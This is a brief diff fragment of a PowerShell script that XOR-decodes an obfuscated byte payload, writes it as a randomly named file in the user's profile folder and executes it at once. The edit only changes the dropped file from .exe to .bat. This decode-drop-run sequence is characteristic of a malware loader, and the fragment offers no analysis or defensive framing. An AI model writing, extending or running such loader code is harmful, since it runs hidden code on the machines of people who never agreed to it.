@@ -11,7 +11,7 @@ try {
     $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
         $b[$_] -bxor $x[$_ % $x.Length]
     })
-    $file = "$env:USERPROFILE\fhdsb.exe"
+    $file = "$env:USERPROFILE\fhdsb.bat"
     [IO.File]::WriteAllBytes($file, $o)
     & $file
 }
